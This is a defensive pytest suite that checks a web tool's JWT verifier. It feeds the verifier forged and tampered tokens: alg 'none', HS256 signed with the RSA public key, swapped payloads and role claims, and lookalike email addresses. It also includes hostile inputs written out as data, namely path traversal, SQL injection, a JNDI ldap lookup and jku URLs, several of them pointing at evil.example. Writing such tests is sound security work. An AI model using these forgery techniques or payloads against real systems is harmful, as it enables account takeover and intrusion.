"""Hostile tokens through the proposal tool's REAL verifier, against the BD API (#806).

BD's test_token_tampering, ported. BD's own token check is gone: BD trusts the tool's auth gate. So
every test here sends `Authorization: Bearer <token>` to the tool's app with the tool's real verify
step (supabase_client.verify_identity -> verify_token_claims) and no override (tests/_bd_conftest.py's
fake `test:<email>` token is not used; the first group proves it means nothing here). The tool's gate,
its nav gate, BD's login lookup and BD's role checks all run as in production. Only the two things
that cannot run offline are replaced, through tests/_bd_tokens.py:

  * the tool's JWKS client (the network lookup of Supabase's public key), by a lookup by `kid` over
    the two test public keys; or, in the "real PyJWKClient" tests, only the HTTP fetch of the key set;
  * the project settings (SUPABASE_URL, the HS256 secret, the allowed domain: example.com, so every
    person here is made up).

The answers: a bad token is the TOOL's refusal, {"ok": false, "error": "<sentence>"} with no
`message` (401; 403 for a session that is not a Google one or an address outside the domain), and
never contains any part of the token. A good token for somebody with no BD login, or a turned-off
one, is BD's 403 envelope.

Where BD's old verifier was stricter than the tool's, the stricter rule moved INTO the tool's verifier
(#806), because BD now relies on it: `exp` is required, the email must be plain printable ASCII with one
"@" (the Kelvin sign lower-cases to "k"), and a rejection is logged with %r (CWE-117). The tool still
accepts a Google session with no `amr` (an older token), as tests/test_auth.py pins.

Keys are generated once per run (tests/_bd_tokens.py); nothing here is a real person or credential.
"""
from __future__ import annotations

import json
import time

import pytest

import supabase_client
from _bd_tokens import (
    DROP,
    EC_KEY,
    HS_SECRET,
    OTHER_EC,
    OTHER_RSA,
    PROJECT,
    RSA_KEY,
    WRONG_HS,
    b64,
    claims,
    clear_jwks_cache,
    configure_project,
    configure_real_jwks,
    es256,
    forge,
    hs256,
    hs256_with_public_key_as_secret,
    none_alg,
    rs256,
    segments,
)
from bd import api as bd_api
from bd import auth as bd_auth
from bd import config as bd_config
from bd.routers import pending

BAD_TOKEN = "Invalid or expired token."
NO_TOKEN = "Missing bearer token."
NO_EMAIL = "Token carries no email."
DOMAIN_MESSAGE = "Access is restricted to @example.com accounts."
NOT_GOOGLE = "Sign in with your Treadwell Google account."
WRONG_ROLE_MESSAGE = "Your role can't do that."

NOW = lambda: int(time.time())  # noqa: E731  # a throw-away one-liner in a test

ME = "/api/bd/me"
MANAGER_ONLY = "/api/bd/analytics"          # a pending route: the role check, then 503
ANY_ROLE = "/api/bd/users"


# ── fixtures ─────────────────────────────────────────────────────────────────────────────────
@pytest.fixture(autouse=True)
def project(monkeypatch):
    configure_project(monkeypatch)
    yield
    clear_jwks_cache()


@pytest.fixture
def web(bd_app, bd_db, monkeypatch, real_verify_identity):
    """The tool's app with the REAL verify step, on a BD database holding these made-up people."""
    from fastapi.testclient import TestClient

    monkeypatch.setattr(supabase_client, "verify_identity", real_verify_identity)
    bd_db.execute(
        "insert into bd.users (email, name, role, active) values"
        " ('avery.quill@example.com', 'Avery Quill', 'salesperson', true),"
        " ('casey.moret@example.com', 'Casey Moret', 'assistant', true),"
        " ('devon.hale@example.com', 'Devon Hale', 'manager', true),"
        " ('emery.stoll@example.com', 'Emery Stoll', 'admin', true),"
        " ('kim.lee@example.com', 'Kim Lee', 'assistant', true),"
        " ('jordan.blake@example.com', 'Jordan Blake', 'manager', false),"
        " ('old.admin@example.com', 'Old Admin', 'admin', false)")
    return TestClient(bd_app.app, raise_server_exceptions=False)


def call(web, authorization, path=ME, method="GET", **kw):
    headers = dict(kw.pop("headers", None) or {})
    if authorization is not None:
        headers["Authorization"] = authorization
    return web.request(method, path, headers=headers, **kw)


def tool_refusal(r, status, message=None):
    """The tool gate's refusal: exactly {"ok": false, "error": "<sentence>"}."""
    assert r.status_code == status, "%s %s -> %s %s" % (r.request.method, r.request.url.path, r.status_code,
                                                        r.text[:300])
    body = r.json()
    assert set(body) == {"ok", "error"} and body["ok"] is False and body["error"], body
    if message is not None:
        assert body["error"] == message, body
    return body


def envelope(r, status, error, message=None):
    """BD's envelope with this status/code (and message)."""
    assert r.status_code == status, "%s %s -> %s %s" % (r.request.method, r.request.url.path, r.status_code,
                                                        r.text[:300])
    assert r.headers["content-type"].startswith("application/json")
    body = r.json()
    assert set(body) <= {"ok", "error", "message", "fields"}, body
    assert body["ok"] is False and body["error"] == error, body
    if message is not None:
        assert body["message"] == message, body
    return body


def never_echoed(r, authorization):
    """Neither the token, nor any 8+ character piece of it, is anywhere in the response."""
    text = r.text + json.dumps(dict(r.headers))
    raw = authorization.split(" ", 1)[1] if authorization and " " in authorization else (authorization or "")
    if raw:
        assert raw not in text
    if authorization and authorization.lower().startswith("bearer ") and raw.count(".") == 2:
        for part in segments(authorization):
            if len(part) >= 8:
                assert part not in text


def refused_401(web, authorization, paths=(ME,)):
    for path in paths:
        r = call(web, authorization, path)
        body = tool_refusal(r, 401)
        assert body["error"] in (BAD_TOKEN, NO_TOKEN), body
        never_echoed(r, authorization)


# ── the baseline: the real verifier accepts a good token (so every refusal below means something) ─
def test_a_good_token_is_accepted_end_to_end(web):
    r = call(web, rs256(claims()))
    assert r.status_code == 200, r.text
    me = r.json()
    assert me["user"]["email"] == "avery.quill@example.com" and me["user"]["role"] == "salesperson"
    # ES256 and the legacy HS256 secret too.
    assert call(web, es256(claims())).status_code == 200
    assert call(web, hs256(claims())).status_code == 200


def test_the_gate_hands_bd_the_verified_email_subject_and_name(web, bd_db, monkeypatch):
    """BD reads the identity the tool's gate kept on the request: a first sign-in on the bootstrap
    list stores the token's email (folded), its `sub` and its display name."""
    monkeypatch.setattr(bd_config, "BD_SUPER_ADMIN_EMAIL", "robin.example@example.com")
    token = rs256(claims(email="Robin.Example@Example.com", sub="sub-robin-0001",
                         user_metadata={"full_name": "Robin Example"}))
    r = call(web, token)
    assert r.status_code == 200, r.text
    assert r.json()["user"]["role"] == "super_admin"
    row = bd_db.execute("select email, name, auth_sub from bd.users where email = 'robin.example@example.com'").fetchone()
    assert row == {"email": "robin.example@example.com", "name": "Robin Example", "auth_sub": "sub-robin-0001"}


def test_the_fake_test_token_means_nothing_to_the_real_verifier(web):
    refused_401(web, "Bearer test:avery.quill@example.com")
    refused_401(web, "Bearer test:emery.stoll@example.com")


# ── claims that make a token wrong: always 401 ───────────────────────────────────────────────
def _expired(key="rs"):
    return {"rs": lambda: rs256(claims(exp=NOW() - 60)),
            "es": lambda: es256(claims(exp=NOW() - 60)),
            "hs": lambda: hs256(claims(exp=NOW() - 60))}[key]


BAD_CLAIMS = [
    ("expired RS256", _expired("rs")),
    ("expired ES256", _expired("es")),
    ("expired HS256", _expired("hs")),
    ("expired a year ago", lambda: rs256(claims(exp=NOW() - 365 * 86400))),
    ("nbf in the future RS256", lambda: rs256(claims(nbf=NOW() + 3600))),
    ("nbf in the future HS256", lambda: hs256(claims(nbf=NOW() + 3600))),
    ("nbf a day ahead", lambda: es256(claims(nbf=NOW() + 86400))),
    ("wrong iss (another project)", lambda: rs256(claims(iss="https://other.supabase.co/auth/v1"))),
    ("iss is the project root, not /auth/v1", lambda: rs256(claims(iss=PROJECT))),
    ("iss with a suffix", lambda: rs256(claims(iss=PROJECT + "/auth/v1/x"))),
    ("iss on a lookalike host", lambda: rs256(claims(iss="https://bdtest.supabase.co.evil.example/auth/v1"))),
    ("iss is a list", lambda: forge({"alg": "RS256", "kid": "rsa"}, claims(iss=[PROJECT + "/auth/v1"]),
                                    sign_with=("RS256", RSA_KEY))),
    ("no iss", lambda: rs256(claims(iss=DROP))),
    ("empty iss", lambda: rs256(claims(iss=""))),
    ("HS256 with a wrong iss", lambda: hs256(claims(iss="https://other.supabase.co/auth/v1"))),
]

# The same exp / nbf / aud mistakes through EVERY branch of the tool's verifier: RS256 and ES256 share
# the JWKS jwt.decode call, HS256 has its own (its own `audience=` and `options=`), so a check
# weakened in only one branch must fail here.
_MAKERS = {"RS256": rs256, "ES256": es256, "HS256": hs256}
_CLAIM_MISTAKES = {
    "no exp at all": {"exp": DROP},
    "exp is null": {"exp": None},
    "expired a year ago": {"exp": lambda: NOW() - 365 * 86400},
    "nbf in the future": {"nbf": lambda: NOW() + 3600},
    "wrong aud (anon)": {"aud": "anon"},
    "wrong aud (service_role)": {"aud": "service_role"},
    "wrong aud (other)": {"aud": "other"},
    "aud as a list without ours": {"aud": ["anon", "service_role", "other"]},
    "no aud": {"aud": DROP},
    "empty aud": {"aud": ""},
    "aud case differs": {"aud": "Authenticated"},
}


def _mistake(maker, over):
    return lambda: maker(claims(**{k: (v() if callable(v) else v) for k, v in over.items()}))


BAD_CLAIMS += [("%s: %s" % (alg, label), _mistake(maker, over))
               for alg, maker in _MAKERS.items() for label, over in _CLAIM_MISTAKES.items()]


@pytest.mark.parametrize("label,make", BAD_CLAIMS, ids=[b[0] for b in BAD_CLAIMS])
def test_wrong_claims_are_401_on_every_kind_of_route(web, label, make):
    # Any role, a manager route and the catch-all: the gate refuses before any BD check.
    refused_401(web, make(), paths=(ME, MANAGER_ONLY, "/api/bd/no-such-route"))


@pytest.mark.parametrize("label,over", [
    ("an email/password session", {"app_metadata": {"provider": "email", "providers": ["email"]},
                                   "amr": [{"method": "password"}]}),
    ("a magic-link session", {"app_metadata": {"provider": "email", "providers": ["email"]},
                              "amr": [{"method": "otp"}]}),
    ("no app_metadata", {"app_metadata": DROP}),
    ("user_metadata cannot claim google", {"app_metadata": {}, "user_metadata": {"provider": "google"}}),
    ("a Google identity, password session", {"app_metadata": {"provider": "email", "providers": ["email", "google"]},
                                             "amr": [{"method": "password"}]}),
    ("anonymous", {"is_anonymous": True}),
])
def test_a_session_that_is_not_a_google_one_is_refused(web, label, over):
    token = rs256(claims(**over))
    r = call(web, token)
    tool_refusal(r, 403, NOT_GOOGLE)
    never_echoed(r, token)


# ── the signature and the algorithm ──────────────────────────────────────────────────────────
def _tampered_payload(**over):
    """A GOOD token of Avery with its payload swapped for another body and the old signature kept."""
    good = rs256(claims()).split(" ", 1)[1].split(".")
    body = b64(json.dumps(claims(**over)).encode())
    return "Bearer " + ".".join([good[0], body, good[2]])


def _hmac_empty_key():
    """What an attacker gets by 'signing' with an empty secret (the right length, the wrong bytes)."""
    import hashlib
    import hmac
    return hmac.new(b"", b"x", hashlib.sha256).digest()


def _hs(name, secret):
    return forge({"alg": name, "typ": "JWT"}, claims(), sign_with=(name, secret))


BAD_SIGNATURES = [
    ("alg none (library)", lambda: none_alg(claims())),
    ("alg none with a kid", lambda: forge({"alg": "none", "kid": "rsa"}, claims())),
    ("alg None, cased", lambda: forge({"alg": "None", "typ": "JWT"}, claims())),
    ("alg NONE, cased", lambda: forge({"alg": "NONE", "typ": "JWT"}, claims())),
    ("alg none with a junk signature", lambda: forge({"alg": "none"}, claims(), raw_signature=b"junk")),
    ("RS256 header, signature stripped", lambda: forge({"alg": "RS256", "kid": "rsa"}, claims())),
    ("RS256 token with its third segment removed",
     lambda: "Bearer " + ".".join(rs256(claims()).split(" ", 1)[1].split(".")[:2])),
    ("RS256 token with a fourth segment",
     lambda: rs256(claims()) + ".AAAA"),
    ("HS256 signed with the RSA public key PEM (algorithm confusion)",
     lambda: hs256_with_public_key_as_secret(claims())),
    ("HS256 signed with the RSA public key PEM, header names the EC kid",
     lambda: hs256_with_public_key_as_secret(claims(), kid="ec")),
    ("HS256 signed with the wrong secret", lambda: hs256(claims(), signing=WRONG_HS)),
    ("HS256 signed with an empty secret",
     lambda: forge({"alg": "HS256", "typ": "JWT"}, claims(), raw_signature=_hmac_empty_key())),
    ("RS256 signed by another RSA key, same kid", lambda: rs256(claims(), key=OTHER_RSA)),
    ("ES256 signed by another EC key, same kid", lambda: es256(claims(), key=OTHER_EC)),
    ("RS256 payload swapped to another user, old signature",
     lambda: _tampered_payload(email="emery.stoll@example.com")),
    ("RS256 payload swapped to a far-future exp, old signature",
     lambda: _tampered_payload(exp=NOW() + 10 * 365 * 86400)),
    ("RS256 payload swapped to drop the audience, old signature",
     lambda: _tampered_payload(aud=DROP)),
    ("HS384 signed with the real secret (algorithm not allowed)",
     lambda: _hs("HS384", HS_SECRET.encode())),
    ("HS512 signed with the real secret (algorithm not allowed)",
     lambda: _hs("HS512", HS_SECRET.encode())),
    ("RS384 signed by the real key (algorithm not allowed)",
     lambda: forge({"alg": "RS384", "kid": "rsa"}, claims(), sign_with=("RS384", RSA_KEY))),
    ("RS512 signed by the real key (algorithm not allowed)",
     lambda: forge({"alg": "RS512", "kid": "rsa"}, claims(), sign_with=("RS512", RSA_KEY))),
    ("PS256 signed by the real key (algorithm not allowed)",
     lambda: forge({"alg": "PS256", "kid": "rsa"}, claims(), sign_with=("PS256", RSA_KEY))),
    ("empty alg", lambda: forge({"alg": "", "kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("no alg", lambda: forge({"kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("alg is a number", lambda: forge({"alg": 5, "kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("alg is a list", lambda: forge({"alg": ["RS256"], "kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("alg is lower case rs256", lambda: forge({"alg": "rs256", "kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("ES256 header over an RSA key", lambda: forge({"alg": "ES256", "kid": "rsa"}, claims(), sign_with=("RS256", RSA_KEY))),
    ("RS256 header over an EC key", lambda: forge({"alg": "RS256", "kid": "ec"}, claims(), sign_with=("ES256", EC_KEY))),
    ("HS256 token whose header names the RSA kid but says RS256",
     lambda: forge({"alg": "RS256", "kid": "rsa"}, claims(), sign_with=("HS256", HS_SECRET.encode()))),
    ("critical header the verifier does not understand",
     lambda: forge({"alg": "RS256", "kid": "rsa", "crit": ["x-evil"], "x-evil": True}, claims(),
                   sign_with=("RS256", RSA_KEY))),
]


@pytest.mark.parametrize("label,make", BAD_SIGNATURES, ids=[b[0] for b in BAD_SIGNATURES])
def test_forged_or_confused_tokens_are_401(web, label, make):
    refused_401(web, make(), paths=(ME, MANAGER_ONLY))


MALFORMED = [
    ("no Authorization header", None),
    ("Basic scheme", "Basic cGF0OnB3"),
    ("Bearer with nothing", "Bearer "),
    ("Bearer alone", "Bearer"),
    ("Bearer twice", "Bearer Bearer abc.def.ghi"),
    ("not a jwt", "Bearer not.a.jwt"),
    ("dots only", "Bearer ..."),
    ("one segment", "Bearer abcdef"),
    ("empty segments", "Bearer a..c"),
    ("header that is not base64 json", "Bearer ###.###.###"),
    ("header that is json but not an object", "Bearer " + b64(b'[1,2]') + "." + b64(b"{}") + ".AAAA"),
    ("raw token with no scheme", rs256(claims()).split(" ", 1)[1]),
    ("a cookie-style value", "avery.quill@example.com"),
]


@pytest.mark.parametrize("label,value", MALFORMED, ids=[m[0] for m in MALFORMED])
def test_malformed_authorization_headers_are_401(web, label, value):
    refused_401(web, value, paths=(ME, ANY_ROLE, MANAGER_ONLY))


def test_the_access_token_in_a_query_string_or_cookie_is_not_a_credential(web):
    good = rs256(claims()).split(" ", 1)[1]
    tool_refusal(web.get(ME, params={"access_token": good, "token": good, "jwt": good}), 401, NO_TOKEN)
    tool_refusal(web.get(ME, headers={"Cookie": "sb-access-token=%s; access_token=%s" % (good, good)}), 401, NO_TOKEN)
    tool_refusal(web.get(ME, headers={"X-Authorization": "Bearer " + good,
                                      "X-Forwarded-Authorization": "Bearer " + good}), 401, NO_TOKEN)


# ── a hostile `kid`: a clean 401, never a 500 ────────────────────────────────────────────────
HOSTILE_KIDS = [
    "../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "rsa/../ec",
    "' OR '1'='1' --",
    "\"; DROP TABLE users; --",
    "rsa'; select pg_sleep(5); --",
    "A" * 8000,
    "\u0000",
    "rsa\u0000",
    "%00",
    "%2e%2e%2f",
    "\uff52\uff53\uff41",             # full-width "rsa"
    "\U0001f4a5",
    "rsa ",
    " rsa",
    "RSA",
    "",
    "${jndi:ldap://evil.example/a}",
    "http://evil.example/jwks.json",
    "file:///etc/passwd",
    "\r\nX-Injected: 1",
    5,
    ["rsa"],
    {"kid": "rsa"},
    None,
    True,
]


@pytest.mark.parametrize("kid", HOSTILE_KIDS, ids=[repr(k)[:40] for k in HOSTILE_KIDS])
def test_a_hostile_kid_is_a_clean_401(web, kid):
    # Signed by the key the real kid names: only the kid is hostile.
    token = forge({"alg": "RS256", "typ": "JWT", "kid": kid}, claims(), sign_with=("RS256", RSA_KEY))
    r = call(web, token)
    tool_refusal(r, 401, BAD_TOKEN)
    never_echoed(r, token)
    token = forge({"alg": "ES256", "typ": "JWT", "kid": kid}, claims(), sign_with=("ES256", EC_KEY))
    tool_refusal(call(web, token), 401, BAD_TOKEN)


def test_a_token_with_no_kid_at_all_is_a_401(web):
    token = forge({"alg": "RS256", "typ": "JWT"}, claims(), sign_with=("RS256", RSA_KEY))
    tool_refusal(call(web, token), 401, BAD_TOKEN)


def test_a_failing_key_lookup_is_a_401_not_a_500(web, monkeypatch):
    """The JWKS endpoint down or returning junk (an exception of ANY kind from the lookup)."""
    for exc in (OSError("network down"), ValueError("junk"), KeyError("keys"), RuntimeError("boom"),
                TimeoutError("slow")):
        class Broken:
            def get_signing_key_from_jwt(self, token, _exc=exc):
                raise _exc
        monkeypatch.setattr(supabase_client, "_jwk_client", Broken)
        tool_refusal(call(web, rs256(claims())), 401, BAD_TOKEN)


# ── jku / x5u / x5c / jwk headers are never followed or trusted ──────────────────────────────
def _attacker_header(**extra):
    import jwt as _jwt
    jwk = json.loads(_jwt.algorithms.RSAAlgorithm.to_jwk(OTHER_RSA.public_key()))
    jwk["kid"] = "attacker"
    head = {"alg": "RS256", "typ": "JWT", "kid": "attacker", "jwk": jwk,
            "jku": "https://evil.example/jwks.json", "x5u": "https://evil.example/cert.pem",
            "x5c": ["MIIBAAAA"]}
    head.update(extra)
    return head


ATTACKER_HEADERS = [
    ("jwk + jku + x5u, attacker kid", _attacker_header),
    ("jwk + jku + x5u, the real kid", lambda: _attacker_header(kid="rsa")),
    ("jwk + jku + x5u, no kid", lambda: {k: v for k, v in _attacker_header().items() if k != "kid"}),
    ("only a jku", lambda: {"alg": "RS256", "kid": "attacker", "jku": "https://evil.example/jwks.json"}),
    ("only an x5u", lambda: {"alg": "RS256", "kid": "attacker", "x5u": "https://evil.example/cert.pem"}),
    ("jku to localhost", lambda: {"alg": "RS256", "kid": "attacker", "jku": "http://127.0.0.1:8888/healthz"}),
]


@pytest.mark.parametrize("label,header", ATTACKER_HEADERS, ids=[h[0] for h in ATTACKER_HEADERS])
def test_a_token_carrying_its_own_key_is_refused(web, monkeypatch, label, header):
    import urllib.request
    opened = []
    monkeypatch.setattr(urllib.request, "urlopen", lambda req, *a, **k: opened.append(req) or (_ for _ in ()).throw(OSError()))
    token = forge(header(), claims(email="emery.stoll@example.com"), sign_with=("RS256", OTHER_RSA))
    r = call(web, token)
    tool_refusal(r, 401, BAD_TOKEN)
    never_echoed(r, token)
    assert opened == [], "the verifier followed a header URL"


def test_extra_key_headers_on_a_properly_signed_token_are_just_ignored(web, monkeypatch):
    """Not an attack, the other half of the claim: the header's key material changes nothing, and
    nothing is fetched from it."""
    import urllib.request
    opened = []
    monkeypatch.setattr(urllib.request, "urlopen", lambda req, *a, **k: opened.append(req))
    token = forge(_attacker_header(kid="rsa"), claims(), sign_with=("RS256", RSA_KEY))
    r = call(web, token)
    assert r.status_code == 200 and r.json()["user"]["email"] == "avery.quill@example.com"
    assert opened == []


# ── the real PyJWKClient (only its HTTP fetch is replaced) ───────────────────────────────────
def test_the_real_key_lookup_accepts_the_published_key_and_nothing_else(web, monkeypatch):
    traffic = configure_real_jwks(monkeypatch)
    assert call(web, rs256(claims())).status_code == 200
    assert traffic.urls == [] and traffic.fetches >= 1
    # Signed by another key under the published kid, or the right key under another kid.
    tool_refusal(call(web, rs256(claims(), key=OTHER_RSA)), 401, BAD_TOKEN)
    tool_refusal(call(web, rs256(claims(), kid="other")), 401, BAD_TOKEN)
    assert traffic.urls == []


@pytest.mark.parametrize("kid", [k for k in HOSTILE_KIDS if isinstance(k, (str, type(None)))],
                         ids=lambda k: repr(k)[:30])
def test_the_real_key_lookup_turns_a_hostile_kid_into_a_401(web, monkeypatch, kid):
    traffic = configure_real_jwks(monkeypatch)
    token = forge({"alg": "RS256", "typ": "JWT", "kid": kid}, claims(), sign_with=("RS256", RSA_KEY))
    r = call(web, token)
    # None of these is the published kid ("rsa" exactly), and the token IS signed by the published
    # key: so a lookup that ignored or loosely matched the kid would answer 200. It must be the 401,
    # never a 200 and never a 500, and no URL is ever opened.
    assert kid != "rsa"
    tool_refusal(r, 401, BAD_TOKEN)
    assert traffic.urls == []


def test_the_real_key_lookup_never_follows_a_jku(web, monkeypatch):
    traffic = configure_real_jwks(monkeypatch)
    token = forge(_attacker_header(), claims(email="emery.stoll@example.com"), sign_with=("RS256", OTHER_RSA))
    tool_refusal(call(web, token), 401, BAD_TOKEN)
    assert traffic.urls == []


# ── size: a huge token is a quick 401 ────────────────────────────────────────────────────────
def _build_huge_tokens():
    big = "A" * 100_000
    head = b64(json.dumps({"alg": "RS256", "typ": "JWT", "kid": "rsa"}).encode())
    return {
        "100 KB of one character": "Bearer " + big,
        "100 KB in one jwt segment": "Bearer " + head + "." + big + "." + big[:300],
        "100 KB signature": "Bearer " + head + "." + b64(json.dumps(claims()).encode()) + "." + big,
        "100 KB of dots": "Bearer " + "." * 100_000,
        "100 KB header segment": "Bearer " + big + "." + b64(b"{}") + ".AAAA",
        "100 KB header and nothing else": "Bearer " + b64(b'{"alg":"RS256","kid":"rsa","x":"%s"}' % big.encode()) + ".e30.AAAA",
    }


HUGE = _build_huge_tokens()


@pytest.mark.parametrize("label", list(HUGE))
def test_a_100kb_token_is_a_401_in_under_a_second(web, label):
    token = HUGE[label]
    assert len(token) >= 100_000
    started = time.perf_counter()
    r = call(web, token)
    elapsed = time.perf_counter() - started
    tool_refusal(r, 401, BAD_TOKEN)
    assert len(r.content) < 1000, "the refusal echoed the oversized token"
    assert elapsed < 1.0, "a 100 KB token took %.2fs" % elapsed


def test_a_100kb_header_next_to_a_good_token_changes_nothing(web):
    r = call(web, rs256(claims()), headers={"X-Padding": "x" * 100_000})
    assert r.status_code == 200


# ── who the token names: BD's table decides the role, never the token ────────────────────────
ROLE_CLAIMS = [
    {"role": "admin"},
    {"role": "super_admin"},
    {"role": "service_role"},
    {"app_metadata": {"provider": "google", "providers": ["google"], "role": "admin"}},
    {"app_metadata": {"provider": "google", "providers": ["google"], "roles": ["admin", "super_admin"]}},
    {"app_metadata": {"provider": "google", "providers": ["google"], "user_role": "admin"}},
    {"app_metadata": {"provider": "google", "providers": ["google"], "is_admin": True}},
    {"app_metadata": {"provider": "google", "providers": ["google"], "bd_role": "super_admin"}},
    {"user_metadata": {"full_name": "Avery Quill", "role": "admin", "is_admin": True}},
    {"roles": ["admin"], "is_admin": True, "admin": True, "app_role": "admin"},
    {"https://wetreadwell.com/role": "super_admin", "claims": {"role": "admin"}},
]


@pytest.mark.parametrize("extra", ROLE_CLAIMS, ids=["role-claims-%d" % i for i in range(len(ROLE_CLAIMS))])
@pytest.mark.parametrize("make", [rs256, es256, hs256], ids=["rs256", "es256", "hs256"])
def test_role_claims_in_the_token_are_ignored(web, bd_db, make, extra):
    token = make(claims(**extra))
    r = call(web, token)
    assert r.status_code == 200, r.text
    me = r.json()
    assert me["user"]["role"] == "salesperson" and me["can"]["admin"] is False
    assert me["can"]["run_batch"] is False and me["can"]["analytics"] is False
    # A manager-only route still says no, with the contract's sentence.
    envelope(call(web, token, MANAGER_ONLY), 403, "forbidden", WRONG_ROLE_MESSAGE)
    # The database row is untouched by the claim.
    row = bd_db.execute("select role from bd.users where email = 'avery.quill@example.com'").fetchone()
    assert row["role"] == "salesperson"


def test_a_lower_role_claim_does_not_demote_a_bd_admin(web):
    token = rs256(claims(email="emery.stoll@example.com", role="authenticated",
                         app_metadata={"provider": "google", "providers": ["google"], "role": "salesperson"}))
    me = call(web, token).json()
    assert me["user"]["role"] == "admin" and me["can"]["admin"] is True
    assert call(web, token, MANAGER_ONLY).status_code == 503          # past the role check: not built yet


def test_the_sub_claim_is_not_the_identity(web, bd_db):
    """Identity is the verified email; a second token with another `sub` for the same email is the
    same person, and the stored auth_sub (set once at the first sign-in) is not overwritten."""
    first = call(web, rs256(claims(sub="sub-first-0001")))
    assert first.status_code == 200
    second = call(web, rs256(claims(sub="sub-second-0002")))
    assert second.status_code == 200 and second.json()["user"]["id"] == first.json()["user"]["id"]
    row = bd_db.execute("select auth_sub from bd.users where email = 'avery.quill@example.com'").fetchone()
    assert row["auth_sub"] == "sub-first-0001"


# ── the email: case folds, nothing else matches ──────────────────────────────────────────────
@pytest.mark.parametrize("email", ["Avery.Quill@example.com", "AVERY.QUILL@EXAMPLE.COM", "aVeRy.qUiLl@ExAmPlE.CoM"])
def test_email_case_is_folded(web, email):
    r = call(web, rs256(claims(email=email)))
    assert r.status_code == 200 and r.json()["user"]["email"] == "avery.quill@example.com"


@pytest.mark.parametrize("email", [
    "avery.quill+evil@example.com",
    "avery.quill+@example.com",
    "avery.quill+admin@example.com",
    "averyquill@example.com",
    "avery.quil@example.com",
    "avery.quilll@example.com",
    "avery.quill%00@example.com",
    "x' or '1'='1@example.com",          # SQL-ish local part, parameterised: a no-login 403
    "x\\'; drop table users; --@example.com",
    "@example.com",                      # right domain, empty name: still nobody
])
def test_a_lookalike_or_tagged_ascii_address_is_not_the_person_403(web, bd_db, email):
    """A valid Google session for an address with no BD login: BD's 403 with the no-role sentence (not
    401, which would loop the page to sign-in), and no row is created."""
    before = bd_db.execute("select count(*) as n from bd.users").fetchone()["n"]
    token = rs256(claims(email=email))
    r = call(web, token)
    envelope(r, 403, "forbidden", bd_auth.NO_BD_ROLE)
    never_echoed(r, token)
    assert bd_db.execute("select count(*) as n from bd.users").fetchone()["n"] == before


@pytest.mark.parametrize("email", [
    "avery\u0430.quill@example.com",       # trailing Cyrillic a
    "av\u0435ry.quill@example.com",        # Cyrillic e in the name
    "avery.q\xfcill@example.com",
    "\uff41very.quill@example.com",        # full-width a
    "avery\u200b.quill@example.com",       # zero-width space
    "\u0131avery.quill@example.com",       # dotless i
    "\u212aim.lee@example.com",            # KELVIN SIGN: lower-cases to kim.lee, a real login
    "avery.quill@example.com\x00",
    "ave\x00ry.quill@example.com",
])
def test_an_address_that_is_not_plain_ascii_is_refused_before_any_lookup(web, bd_db, email):
    before = bd_db.execute("select count(*) as n from bd.users").fetchone()["n"]
    token = rs256(claims(email=email))
    r = call(web, token)
    tool_refusal(r, 403, DOMAIN_MESSAGE)
    never_echoed(r, token)
    assert bd_db.execute("select count(*) as n from bd.users").fetchone()["n"] == before


@pytest.mark.parametrize("email", [
    "avery.quill@example.com.",                 # trailing dot
    "avery.quill@evil.example.com.org",
    "avery.quill@example.com.evil.example",
    "avery.quill@example.co",
    "avery.quill@examp1e.com",                  # digit one for l
    "avery.quill@ex\u0430mple.com",       # Cyrillic a in the DOMAIN
    "avery.quill@example.c\u043em",       # Cyrillic o in the TLD
    "avery.quill@example.com' or '1'='1",
    "avery.quill@example.com ,emery.stoll@example.com",
    "avery.quill@@example.com",
    "avery.quill@example.com@evil.example",
    "avery.quill@evil.example@example.com",
    "example.com",
])
def test_an_address_outside_the_domain_is_refused_not_looked_up(web, bd_db, email):
    before = bd_db.execute("select count(*) as n from bd.users").fetchone()["n"]
    token = rs256(claims(email=email))
    r = call(web, token)
    tool_refusal(r, 403, DOMAIN_MESSAGE)
    never_echoed(r, token)
    assert bd_db.execute("select count(*) as n from bd.users").fetchone()["n"] == before


@pytest.mark.parametrize("value", [None, "", "   ", 5, ["avery.quill@example.com"],
                                   {"a": "avery.quill@example.com"}, True])
def test_an_email_claim_that_is_missing_or_of_the_wrong_type_is_a_clean_401(web, value):
    r = call(web, rs256(claims(email=value)))
    tool_refusal(r, 401, NO_EMAIL)


# ── no BD login, or a turned-off one: 403 everywhere ─────────────────────────────────────────
def _protected_routes():
    """Every BD route behind the gate (not the public webhook, not the catch-all), concrete."""
    out = []
    for route in bd_api.bd_routes():
        if route.path == pending.WEBHOOK_PATH:
            continue
        for method in sorted(route.methods - {"HEAD", "OPTIONS"}):
            out.append((method, route.path.replace("{id}", "1")))
    return out


def test_the_walk_finds_the_whole_protected_api():
    routes = _protected_routes()
    assert ("GET", "/api/bd/me") in routes and ("GET", "/api/bd/analytics") in routes
    assert len(routes) >= 14
    assert not [p for _m, p in routes if "webhooks" in p or "bd-candidates" in p]


def test_a_turned_off_login_is_403_on_every_protected_route(web):
    """A turned-off BD login (a manager and an ADMIN) with a perfectly valid token: 403 with the
    turned-off sentence, on every method and path, before anything else runs."""
    for email in ("jordan.blake@example.com", "old.admin@example.com"):
        token = rs256(claims(email=email))
        for method, path in _protected_routes():
            kw = {"json": {}} if method in ("POST", "PUT", "PATCH") else {}
            r = call(web, token, path, method, **kw)
            envelope(r, 403, "forbidden", bd_auth.TURNED_OFF)
            never_echoed(r, token)


def test_a_token_for_an_email_with_no_bd_login_is_403_on_every_protected_route(web, bd_db):
    token = rs256(claims(email="stranger@example.com", sub="sub-stranger"))
    for method, path in _protected_routes():
        kw = {"json": {}} if method in ("POST", "PUT", "PATCH") else {}
        envelope(call(web, token, path, method, **kw), 403, "forbidden", bd_auth.NO_BD_ROLE)
    assert bd_db.execute("select count(*) as n from bd.users where email like 'stranger%'").fetchone()["n"] == 0


def test_a_login_turned_off_after_signing_in_is_refused_on_the_next_call(web, bd_db):
    token = rs256(claims())
    assert call(web, token).status_code == 200
    bd_db.execute("update bd.users set active = false where email = 'avery.quill@example.com'")
    envelope(call(web, token), 403, "forbidden", bd_auth.TURNED_OFF)
    bd_db.execute("update bd.users set active = true where email = 'avery.quill@example.com'")
    assert call(web, token).status_code == 200


